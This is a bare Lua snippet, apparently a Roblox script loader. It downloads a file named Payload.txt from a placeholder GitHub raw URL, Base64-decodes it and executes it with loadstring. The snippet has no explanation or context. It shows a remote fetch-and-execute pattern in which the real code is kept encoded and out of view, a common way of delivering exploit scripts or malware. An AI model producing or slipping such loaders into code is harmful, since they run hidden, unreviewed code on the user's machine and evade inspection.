local encoded =
game:HttpGet(
"https://raw.githubusercontent.com/USERNAME/REPO/main/Payload.txt"
)

local decoded =
game:GetService("HttpService"):Base64Decode(encoded)

loadstring(decoded)()
